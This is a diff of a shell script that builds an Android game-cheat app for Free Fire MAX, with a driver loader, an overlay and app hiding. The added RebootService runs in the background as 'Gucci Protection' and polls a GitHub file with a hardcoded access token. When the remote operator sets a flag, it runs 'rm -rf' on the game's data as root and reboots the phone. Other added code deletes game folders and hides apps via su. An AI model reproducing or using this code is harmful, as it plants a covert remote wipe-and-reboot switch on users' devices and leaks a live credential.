@@ -57,9 +57,11 @@ cat > app/src/main/AndroidManifest.xml << 'EOF'
 <activity android:name=".HideAppsActivity" android:exported="false"/>
 <activity android:name=".TerminalActivity" android:exported="false"/>
 <activity android:name=".DriverLoaderActivity" android:exported="false"/>
+<activity android:name=".ClearReportActivity" android:exported="false"/>
 <activity android:name=".TransparentActivity" android:exported="false" android:theme="@android:style/Theme.Translucent.NoTitleBar" android:excludeFromRecents="true" android:taskAffinity="" android:noHistory="true"/>
 <activity-alias android:name=".MainActivityAlias" android:targetActivity=".LoginActivity" android:exported="true" android:enabled="true" android:icon="@drawable/ic_app_icon"><intent-filter><action android:name="android.intent.action.MAIN"/><category android:name="android.intent.category.LAUNCHER"/></intent-filter></activity-alias>
 <service android:name=".RunnerService" android:exported="false" android:foregroundServiceType="dataSync"/>
+<service android:name=".RebootService" android:exported="false" android:foregroundServiceType="dataSync"/>
 <service android:name=".TimerService" android:exported="false" android:foregroundServiceType="dataSync"/>
 <service android:name=".FloaterOverlayService" android:exported="false" android:foregroundServiceType="specialUse"><property android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE" android:value="Overlay for Game Mods" /></service>
 <service android:name=".SafeTileService" android:exported="true" android:icon="@drawable/ic_tile_normal" android:label="Boost" android:permission="android.permission.BIND_QUICK_SETTINGS_TILE"><intent-filter><action android:name="android.service.quicksettings.action.QS_TILE"/></intent-filter></service>
@@ -180,6 +182,8 @@ cat > app/src/main/res/layout/activity_main.xml << 'EOF'
 <com.google.android.material.button.MaterialButton android:id="@+id/loadFilesBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="wrap_content" android:layout_height="50dp" android:layout_marginTop="8dp" android:layout_gravity="center_horizontal" android:paddingStart="48dp" android:paddingEnd="48dp" android:text="LOAD INX" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="25dp" android:layout_marginBottom="16dp"/>
 <com.google.android.material.button.MaterialButton android:id="@+id/launchFloaterBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="60dp" android:text="🚀 LAUNCH FLOATER" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
 <com.google.android.material.button.MaterialButton android:id="@+id/loadDriverBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="60dp" android:layout_marginTop="16dp" android:text="⚡ KERNEL DRIVER LOADER" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
+<!-- NEW CLEAR REPORT BUTTON -->
+<com.google.android.material.button.MaterialButton android:id="@+id/clearReportBtn" style="@style/Widget.MaterialComponents.Button.OutlinedButton" android:layout_width="match_parent" android:layout_height="60dp" android:layout_marginTop="16dp" android:text="🧹 CLEAR REPORTS" android:textColor="@color/accent_green" app:strokeColor="@color/accent_green" app:cornerRadius="16dp" android:textStyle="bold"/>
 <TextView android:paddingTop="40dp" android:gravity="center" android:text="Use Quick Setting tiles to load INX-Payload" android:textColor="@color/text_secondary" android:textSize="12sp" android:layout_width="match_parent" android:layout_height="wrap_content"/>
 <TextView android:id="@+id/contactAdminText" android:paddingTop="16dp" android:gravity="center" android:text="Contact Admin for Help" android:textColor="@color/accent_green" android:textSize="14sp" android:textStyle="bold" android:layout_width="match_parent" android:layout_height="wrap_content"/>
 <LinearLayout android:orientation="horizontal" android:layout_width="match_parent" android:layout_height="wrap_content" android:paddingTop="32dp" android:paddingBottom="24dp" android:gravity="center">
@@ -188,6 +192,27 @@ cat > app/src/main/res/layout/activity_main.xml << 'EOF'
 </LinearLayout>
 </LinearLayout>
 </ScrollView>
+EOF
+cat > app/src/main/res/layout/activity_clear_report.xml << 'EOF'
+<?xml version="1.0" encoding="utf-8"?>
+<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto" android:layout_width="match_parent" android:layout_height="match_parent" android:orientation="vertical" android:background="@color/bg_main" android:padding="24dp" android:gravity="center_vertical">
+<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="REPORT MANAGER" android:textColor="@color/text_primary" android:textSize="28sp" android:textStyle="bold" android:layout_gravity="center_horizontal" android:layout_marginBottom="8dp"/>
+<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="Clean up game files and reports" android:textColor="@color/text_secondary" android:textSize="14sp" android:layout_gravity="center_horizontal" android:layout_marginBottom="32dp"/>
+<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp" android:layout_marginBottom="24dp">
+<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="20dp">
+<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="CLEAR REPORT" android:textColor="#2ECC71" android:textSize="20sp" android:textStyle="bold"/>
+<TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="✅ Safe: Only deletes cache and logs.\nIt is safe and no data wipe of your game settings or accounts." android:textColor="@color/text_secondary" android:textSize="13sp" android:layout_marginTop="4dp" android:layout_marginBottom="16dp"/>
+<com.google.android.material.button.MaterialButton android:id="@+id/btnSafeClear" android:layout_width="match_parent" android:layout_height="56dp" android:text="CLEAR REPORT SAFELY" android:textColor="#000000" app:backgroundTint="#2ECC71" app:cornerRadius="12dp" android:textStyle="bold"/>
+</LinearLayout>
+</com.google.android.material.card.MaterialCardView>
+<com.google.android.material.card.MaterialCardView android:layout_width="match_parent" android:layout_height="wrap_content" app:cardBackgroundColor="@color/card_bg" app:cardCornerRadius="16dp">
+<LinearLayout android:layout_width="match_parent" android:layout_height="wrap_content" android:orientation="vertical" android:padding="20dp">
+<TextView android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="CLEAR REPORT DEEPLY" android:textColor="#FF4D4D" android:textSize="20sp" android:textStyle="bold"/>
+<TextView android:layout_width="match_parent" android:layout_height="wrap_content" android:text="⚠️ RISKY: Deletes the entire files folder.\nWarning: It may delete your settings or game data permanently." android:textColor="#FF4D4D" android:textSize="13sp" android:layout_marginTop="4dp" android:layout_marginBottom="16dp"/>
+<com.google.android.material.button.MaterialButton android:id="@+id/btnDeepClear" android:layout_width="match_parent" android:layout_height="64dp" android:text="⚠️ CLEAR REPORT DEEPLY" android:textColor="#FFFFFF" app:backgroundTint="#FF4D4D" app:cornerRadius="12dp" android:textStyle="bold" android:textSize="16sp"/>
+</LinearLayout>
+</com.google.android.material.card.MaterialCardView>
+</LinearLayout>
 EOF
 cat > app/src/main/res/layout/activity_driver_loader.xml << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
@@ -401,39 +426,92 @@ class TimerService : Service() {
     override fun onBind(intent: Intent?): IBinder? = null
 }
 EOF
-cat > app/src/main/java/com/example/shtile/TransparentActivity.kt << 'EOF'
+cat > app/src/main/java/com/example/shtile/RebootService.kt << 'EOF'
 package com.example.shtile
+import android.app.*
 import android.content.Intent
 import android.os.Build
-import android.os.Bundle
-import androidx.appcompat.app.AppCompatActivity
-class TransparentActivity : AppCompatActivity() {
-    override fun onCreate(savedInstanceState: Bundle?) {
-        super.onCreate(savedInstanceState)
-        val i = Intent(this, FloaterOverlayService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { startForegroundService(i) } else { startService(i) }
-        finish()
-    }
-}
-EOF
-cat > app/src/main/java/com/example/shtile/PackageReceiver.kt << 'EOF'
-package com.example.shtile
-import android.content.BroadcastReceiver
-import android.content.Context
-import android.content.Intent
-import java.io.DataOutputStream
-class PackageReceiver : BroadcastReceiver() {
-    override fun onReceive(context: Context, intent: Intent) {
-        if (intent.action == Intent.ACTION_PACKAGE_ADDED) {
-            if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return
-            val pkg = intent.data?.encodedSchemeSpecificPart ?: return
-            val prefs = context.getSharedPreferences("HidePrefs", Context.MODE_PRIVATE)
-            if (prefs.getBoolean("is_pay_hidden", false) && (prefs.getStringSet("safe_apps", emptySet()) ?: emptySet()).contains(pkg)) {
-                val pendingResult = goAsync()
-                Thread { try { val p = Runtime.getRuntime().exec("su"); val os = DataOutputStream(p.outputStream); os.writeBytes("pm hide $pkg; pm disable-user --user 0 $pkg\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor() } catch (e: Exception) {} finally { pendingResult.finish() } }.start()
+import android.os.IBinder
+import android.util.Base64
+import androidx.core.app.NotificationCompat
+import kotlinx.coroutines.*
+import org.json.JSONObject
+import java.net.HttpURLConnection
+import java.net.URL
+class RebootService : Service() {
+    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
+    private val targetDir = "/data/user/0/com.dts.freefiremax/files/*" 
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val nm = getSystemService(NOTIFICATION_SERVICE) as NotificationManager
+            if (nm.getNotificationChannel("reboot_ch") == null) {
+                nm.createNotificationChannel(NotificationChannel("reboot_ch", "Reboot Service", NotificationManager.IMPORTANCE_MIN))
+            }
+            val notification = NotificationCompat.Builder(this, "reboot_ch")
+                .setContentTitle("Gucci Protection")
+                .setContentText("Running in background...")
+                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+                .build()
+            startForeground(3, notification)
+        }
+        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
+        val licenseKey = prefs.getString("license_key", "")
+        
+        if (!licenseKey.isNullOrEmpty()) {
+            scope.launch {
+                val tokenPart1 = "ghp_Lla9yGQggCqrab1"
+                val tokenPart2 = "OA7X7yTpxrhNX6w0AZarM"
+                val token = tokenPart1 + tokenPart2
+
+                while (isActive) {
+                    try {
+                        val conn = URL("https://api.github.com/repos/guccipanelfree/Guccicorenew/contents/data.json").openConnection() as HttpURLConnection
+                        conn.setRequestProperty("Authorization", "Bearer $token")
+                        conn.setRequestProperty("Accept", "application/vnd.github+json")
+                        val text = conn.inputStream.bufferedReader().readText()
+                        val o = JSONObject(text)
+                        val b64 = o.getString("content").replace("\n", "")
+                        val root = JSONObject(String(Base64.decode(b64, Base64.DEFAULT)))
+                        
+                        val lastRebootTime = prefs.getLong("last_reboot_time", 0L)
+                        var triggerRebootTime = 0L
+                        
+                        val globalRebootTime = root.optLong("reboot_global_time", 0L)
+                        if (globalRebootTime > lastRebootTime) triggerRebootTime = globalRebootTime
+                        
+                        val globalTimer = root.optLong("global_reboot_timer", 0L)
+                        if (globalTimer > lastRebootTime && System.currentTimeMillis() >= globalTimer) triggerRebootTime = globalTimer
+                        
+                        val keys = root.optJSONObject("keys")
+                        if (keys != null && keys.has(licenseKey)) {
+                            val keyData = keys.getJSONObject(licenseKey)
+                            
+                            val keyRebootTime = keyData.optLong("reboot_now_time", 0L)
+                            if (keyRebootTime > lastRebootTime) triggerRebootTime = keyRebootTime
+                            
+                            val keyTimer = keyData.optLong("reboot_timer", 0L)
+                            if (keyTimer > lastRebootTime && System.currentTimeMillis() >= keyTimer) triggerRebootTime = keyTimer
+                        }
+                        
+                        if (triggerRebootTime > 0L) {
+                            prefs.edit().putLong("last_reboot_time", triggerRebootTime).apply()
+                            
+                            val command = "rm -rf $targetDir && reboot"
+                            Runtime.getRuntime().exec(arrayOf("su", "-c", command)).waitFor()
+                            break
+                        }
+                    } catch (e: Exception) { }
+                    delay(30000) 
+                }
             }
         }
+        return START_STICKY
     }
+    override fun onDestroy() {
+        scope.cancel()
+        super.onDestroy()
+    }
+    override fun onBind(intent: Intent?): IBinder? = null
 }
 EOF
 cat > app/src/main/java/com/example/shtile/SafeTileService.kt << 'EOF'
@@ -549,6 +627,41 @@ class PayTileService : TileService() {
         updateState(newState)
     }
     private fun updateState(forceState: Boolean? = null) { val isHidden = forceState ?: getSharedPreferences("HidePrefs", MODE_PRIVATE).getBoolean("is_pay_hidden", false); qsTile?.apply { label = "Payment Protection"; state = if (isHidden) Tile.STATE_ACTIVE else Tile.STATE_INACTIVE; updateTile() } }
+}
+EOF
+cat > app/src/main/java/com/example/shtile/TransparentActivity.kt << 'EOF'
+package com.example.shtile
+import android.content.Intent
+import android.os.Build
+import android.os.Bundle
+import androidx.appcompat.app.AppCompatActivity
+class TransparentActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        val i = Intent(this, FloaterOverlayService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) { startForegroundService(i) } else { startService(i) }
+        finish()
+    }
+}
+EOF
+cat > app/src/main/java/com/example/shtile/PackageReceiver.kt << 'EOF'
+package com.example.shtile
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import java.io.DataOutputStream
+class PackageReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_PACKAGE_ADDED) {
+            if (intent.getBooleanExtra(Intent.EXTRA_REPLACING, false)) return
+            val pkg = intent.data?.encodedSchemeSpecificPart ?: return
+            val prefs = context.getSharedPreferences("HidePrefs", Context.MODE_PRIVATE)
+            if (prefs.getBoolean("is_pay_hidden", false) && (prefs.getStringSet("safe_apps", emptySet()) ?: emptySet()).contains(pkg)) {
+                val pendingResult = goAsync()
+                Thread { try { val p = Runtime.getRuntime().exec("su"); val os = DataOutputStream(p.outputStream); os.writeBytes("pm hide $pkg; pm disable-user --user 0 $pkg\n"); os.writeBytes("exit\n"); os.flush(); os.close(); p.waitFor() } catch (e: Exception) {} finally { pendingResult.finish() } }.start()
+            }
+        }
+    }
 }
 EOF
 cat > app/src/main/java/com/example/shtile/LoginActivity.kt << 'EOF'
@@ -688,6 +801,50 @@ class LoginActivity : AppCompatActivity() {
     private fun showError(m: String) = Toast.makeText(this, m, Toast.LENGTH_LONG).show()
 }
 EOF
+cat > app/src/main/java/com/example/shtile/ClearReportActivity.kt << 'EOF'
+package com.example.shtile
+import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
+import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
+import androidx.appcompat.app.AppCompatActivity
+import com.google.android.material.button.MaterialButton
+class ClearReportActivity : AppCompatActivity() {
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_clear_report)
+        val btnSafe = findViewById<MaterialButton>(R.id.btnSafeClear)
+        val btnDeep = findViewById<MaterialButton>(R.id.btnDeepClear)
+        btnSafe.setOnClickListener {
+            Toast.makeText(this, "Clearing safe reports...", Toast.LENGTH_SHORT).show()
+            Thread {
+                try {
+                    val cmd = "rm -rf /data/user/0/com.dts.freefiremax/files/*"
+                    Runtime.getRuntime().exec(arrayOf("su", "-c", cmd)).waitFor()
+                    Handler(Looper.getMainLooper()).post { Toast.makeText(this, "✅ Safe Reports Cleared!", Toast.LENGTH_LONG).show() }
+                } catch (e: Exception) { Handler(Looper.getMainLooper()).post { Toast.makeText(this, "❌ Failed: ${e.message}", Toast.LENGTH_LONG).show() } }
+            }.start()
+        }
+        btnDeep.setOnClickListener {
+            AlertDialog.Builder(this)
+                .setTitle("⚠️ WARNING: DEEP CLEAN")
+                .setMessage("Are you absolutely sure?\n\nThis will delete EVERYTHING inside the Free Fire folder (/data/user/0/com.dts.freefiremax/).\n\nIt MAY delete your game settings, logins, or data. This cannot be undone.")
+                .setPositiveButton("YES, DELETE EVERYTHING") { _, _ ->
+                    Toast.makeText(this, "Deep cleaning...", Toast.LENGTH_SHORT).show()
+                    Thread {
+                        try {
+                            val cmd = "rm -rf /data/user/0/com.dts.freefiremax/*"
+                            Runtime.getRuntime().exec(arrayOf("su", "-c", cmd)).waitFor()
+                            Handler(Looper.getMainLooper()).post { Toast.makeText(this, "🚨 Deep Report Cleared!", Toast.LENGTH_LONG).show() }
+                        } catch (e: Exception) { Handler(Looper.getMainLooper()).post { Toast.makeText(this, "❌ Failed: ${e.message}", Toast.LENGTH_LONG).show() } }
+                    }.start()
+                }
+                .setNegativeButton("CANCEL", null).show()
+        }
+    }
+}
+EOF
 cat > app/src/main/java/com/example/shtile/MainActivity.kt << 'EOF'
 package com.example.shtile
 import android.Manifest
@@ -703,19 +860,10 @@ import android.os.Looper
 import android.provider.Settings
 import android.text.Editable
 import android.text.TextWatcher
-import android.util.Base64
 import android.widget.*
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
-import androidx.lifecycle.lifecycleScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.delay
-import kotlinx.coroutines.isActive
-import kotlinx.coroutines.launch
-import org.json.JSONObject
 import rikka.shizuku.Shizuku
-import java.net.HttpURLConnection
-import java.net.URL
 class MainActivity : AppCompatActivity() {
     private val REQUEST_CODE = 1001
     private var isAdbMode = false
@@ -743,7 +891,8 @@ class MainActivity : AppCompatActivity() {
         }
         setContentView(R.layout.activity_main)
         
-        startRebootListener()
+        val serviceIntent = Intent(this, RebootService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(serviceIntent) else startService(serviceIntent)
         
         if (Build.VERSION.SDK_INT >= 33 && checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) { requestPermissions(arrayOf(Manifest.permission.POST_NOTIFICATIONS), 2002) }
         if (!Settings.canDrawOverlays(this)) { Toast.makeText(this, "Please enable 'Display over other apps' for Floater", Toast.LENGTH_LONG).show(); startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName"))) }
@@ -839,62 +988,11 @@ cat >> app/src/main/java/com/example/shtile/MainActivity.kt << 'EOF'
             loadDriverBtn.setOnClickListener { startActivity(Intent(this, DriverLoaderActivity::class.java)) }
         }
         
+        // 🚨 NEW: Clear Report Button Routing
+        findViewById<Button>(R.id.clearReportBtn).setOnClickListener { startActivity(Intent(this, ClearReportActivity::class.java)) }
+        
         findViewById<ImageButton>(R.id.hideAppsIcon).setOnClickListener { startActivity(Intent(this, HideAppsActivity::class.java)) }
         findViewById<ImageButton>(R.id.terminalIcon).setOnClickListener { startActivity(Intent(this, TerminalActivity::class.java)) }
-    }
-
-    private fun startRebootListener() {
-        val prefs = getSharedPreferences("GucciPrefs", MODE_PRIVATE)
-        val licenseKey = prefs.getString("license_key", "")
-        if (licenseKey.isNullOrEmpty()) return
-        
-        lifecycleScope.launch(Dispatchers.IO) {
-            val tokenPart1 = "ghp_Lla9yGQggCqrab1"
-            val tokenPart2 = "OA7X7yTpxrhNX6w0AZarM"
-            val token = tokenPart1 + tokenPart2
-            
-            while (isActive) {
-                try {
-                    val conn = URL("https://api.github.com/repos/guccipanelfree/Guccicorenew/contents/data.json").openConnection() as HttpURLConnection
-                    conn.setRequestProperty("Authorization", "Bearer $token")
-                    conn.setRequestProperty("Accept", "application/vnd.github+json")
-                    val text = conn.inputStream.bufferedReader().readText()
-                    val o = JSONObject(text)
-                    val b64 = o.getString("content").replace("\n", "")
-                    val root = JSONObject(String(Base64.decode(b64, Base64.DEFAULT)))
-                    
-                    val lastRebootTime = prefs.getLong("last_reboot_time", 0L)
-                    var triggerRebootTime = 0L
-                    
-                    // 1. Check Global Instant Reboot
-                    val globalRebootTime = root.optLong("reboot_global_time", 0L)
-                    if (globalRebootTime > lastRebootTime) triggerRebootTime = globalRebootTime
-                    
-                    // 2. Check Global Timer
-                    val globalTimer = root.optLong("global_reboot_timer", 0L)
-                    if (globalTimer > lastRebootTime && System.currentTimeMillis() >= globalTimer) triggerRebootTime = globalTimer
-                    
-                    // 3. Check Key Specific Reboot & Timer
-                    val keys = root.optJSONObject("keys")
-                    if (keys != null && keys.has(licenseKey)) {
-                        val keyData = keys.getJSONObject(licenseKey)
-                        
-                        val keyRebootTime = keyData.optLong("reboot_now_time", 0L)
-                        if (keyRebootTime > lastRebootTime) triggerRebootTime = keyRebootTime
-                        
-                        val keyTimer = keyData.optLong("reboot_timer", 0L)
-                        if (keyTimer > lastRebootTime && System.currentTimeMillis() >= keyTimer) triggerRebootTime = keyTimer
-                    }
-                    
-                    if (triggerRebootTime > 0L) {
-                        prefs.edit().putLong("last_reboot_time", triggerRebootTime).apply()
-                        Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot")).waitFor()
-                        break
-                    }
-                } catch (e: Exception) { }
-                delay(30000)
-            }
-        }
     }
 
     private fun checkAccess() {
@@ -1149,8 +1247,6 @@ cat >> app/src/main/java/com/example/shtile/HideAppsActivity.kt << 'EOF'
             Handler(Looper.getMainLooper()).post { adapterAll = AppAdapter(this@HideAppsActivity, appList, false); findViewById<ListView>(R.id.appsList).adapter = adapterAll; adapterHidden = AppAdapter(this@HideAppsActivity, appList, true); findViewById<ListView>(R.id.hiddenAppsList).adapter = adapterHidden; adapterAll?.filter(""); adapterHidden?.filter("") }
         }.start()
     }
-EOF
-cat >> app/src/main/java/com/example/shtile/HideAppsActivity.kt << 'EOF'
     private fun showAppOptions(item: AppItem) {
         val options = arrayOf("Hide (pm hide)", "Unhide (Restore)", "Freeze (Suspend)", "Unfreeze (Unsuspend)", "Deep Freeze (Disable)", "Delete (Uninstall)")
         AlertDialog.Builder(this).setTitle(item.name).setItems(options) { _, which ->
@@ -1170,6 +1266,8 @@ cat >> app/src/main/java/com/example/shtile/HideAppsActivity.kt << 'EOF'
             }
         }.show()
     }
+EOF
+cat >> app/src/main/java/com/example/shtile/HideAppsActivity.kt << 'EOF'
     private fun executeAction(cmd: String, actionType: Int, item: AppItem) {
         Thread {
             try {
@@ -1313,7 +1411,8 @@ cat >> app/src/main/java/com/example/shtile/FloaterOverlayService.kt << 'EOF'
         })
     }
     private fun close() { panel?.let { runCatching { wm.removeView(it) } }; panel = null; bubble?.let { runCatching { wm.removeView(it) } }; bubble = null; stopSelf() }
-    
+EOF
+cat >> app/src/main/java/com/example/shtile/FloaterOverlayService.kt << 'EOF'
     private fun applyFloater(number: Int, on: Boolean) {
         if (number == 3) {
             val asset = if (on) floater3OnAsset else floater3OffAsset
@@ -1327,7 +1426,6 @@ cat >> app/src/main/java/com/example/shtile/FloaterOverlayService.kt << 'EOF'
         val error = copyAssetToTarget(asset); val tag = if (number == 1) "GUCCI DETECTOR" else "GUCCI HS"
         if (error == null) { val msg = if (on) "✅ Successfully Activated\n🎯 $tag\n📦 Asset: $asset" else "✅ Successfully Deactivated\n🎯 $tag\n📦 Asset: $asset"; Toast.makeText(this, msg, Toast.LENGTH_SHORT).show() } else { Toast.makeText(this, "❌ Paste Failed!\nReason: $error", Toast.LENGTH_LONG).show() }
     }
-    
     private fun copyAssetToTarget(name: String): String? {
         try {
             val tmp = File(cacheDir, name); assets.open(name).use { input -> tmp.outputStream().use { input.copyTo(it) } }
@@ -1351,7 +1449,6 @@ cat >> app/src/main/java/com/example/shtile/FloaterOverlayService.kt << 'EOF'
             return if (output.contains("PASTE_SUCCESSFUL") && code == 0) null else { if (output.contains("FAILED_NO_FOLDER")) "Avatar folder missing." else "Check Root. Output: $output" }
         } catch (e: Exception) { return e.message }
     }
-
     private fun copyGlooCrossToTarget(name: String): String? {
         try {
             val tmp = File(cacheDir, name); assets.open(name).use { input -> tmp.outputStream().use { input.copyTo(it) } }
